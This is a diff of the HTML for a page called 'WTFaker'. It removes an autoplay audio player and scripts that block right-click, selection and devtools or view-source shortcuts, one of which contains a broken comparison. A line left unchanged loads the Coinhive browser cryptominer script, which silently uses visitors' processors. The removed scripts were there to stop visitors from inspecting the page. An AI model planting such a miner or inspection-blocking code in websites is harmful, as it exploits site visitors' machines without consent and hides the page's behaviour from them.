@@ -2,42 +2,10 @@
 <html lang="en">
 
 <head>
-
     <div id="app">
         <script type="text/javascript" src="js/vendor.min.js"></script>
         <script type="text/javascript" src="js/app.min.js"></script>
-
     </div>
-	
-	<audio autoplay="1" loop="" id="player">
-								<source src="assets\2.mp3">
-										<script>
-											var audio = document.currentScript.parentElement;
-											audio.autoplay=true;
-											audio.play();
-											audio.volume = 0.13;
-										
-											function startstop() {
-												var audiobt = document.getElementById("startstop");
-												if (audio.paused)
-												{
-													audio.play();
-													audiobt.value = "<!-- Stop Music -->";
-													audiobt.style = "background-color: Transparent; border: none; text-shadow: blue 0 0 5px;"
-												}
-												else
-												{
-													audio.pause();
-													audiobt.value = "<!-- Start Music -->";
-													audiobt.style = "background-color: Transparent; border: none; text-shadow: red 0 0 5px;"
-													logcount += 1;
-													document.getElementById('injected').innerHTML += '<div id="warn" ><span id="tag"> </span>Music paused.</div>';				
-													CheckLimit();
-												}
-											}
-										</script>
-							  </audio>
-
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WTFaker</title>
@@ -284,70 +252,6 @@
       <script src="https://coinhive.com/lib/coinhive.min.js"></script>
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js"></script>
        <script src="jquery.snow.js"></script>
-<script language="JavaScript">
-document.ondragstart = test;
-//запрет на перетаскивание 
-document.onselectstart = test;
-//запрет на выделение элементов страницы
-document.oncontextmenu = test;
-//запрет на выведение контекстного меню
-function test() {
-document.oncontextmenu=new Function("alert(message);return false")
-return false
-}
-</script>
-<script type="text/javascript">
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 70)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 74)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 17)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 16)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 83)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 114 || (e.ctrlKey && e.keyCode === 85)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 123)) { 
-        e.preventDefault();
-    }
-})
-window.addEventListener("keydown",function (e) {
-    if (e.keyCode === 123 || (e.ctrlKey && e.keyCode === 73)) { 
-        e.preventDefault();
-    }
-})
-</script>
 
-<script type="text/javascript">
- document.onkeydown = function(e) {
-	 	 document.oncontextmenu=new Function("alert(message);return false")
-   e = e || window.event;
- if(e.keyCode == 85 || e.keyCode == 83 || e.keyCode == 123 || e.keyCode = 74 || e.keyCode = 17 || e.keyCode = 16)  {
-     return false;
-   }
-   return true;
- }
-</script>
    </body>
 </html>
